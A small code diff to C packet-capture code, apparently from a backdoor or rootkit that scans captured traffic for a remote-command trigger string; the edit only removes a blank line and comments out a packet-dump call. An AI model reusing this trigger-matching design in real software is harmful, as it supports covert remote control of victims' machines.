@@ -184,7 +184,6 @@ void *xcap(void *v_dev_name) {
     //boopprintf("[PRE] IP Dest Address = %s\n", inet_ntoa(iph->ip_dst));
     //boopprintf("IP Packet size = %d\n", len-16);
 
-
     if (xcap_pos == XCAP_BUFFER_SIZE) {
       // Start the ring buffer back at 0, and we have now
       // completed a "cycle"
@@ -281,7 +280,7 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
       int found;
       found = rce_filter(rce_sub, rce);
       if (found){
-        xpack_dump(xpack);
+        //xpack_dump(xpack);
         snapshot_free(snap);
         return 0; // Money, Success, Fame, Glamour
       }else {
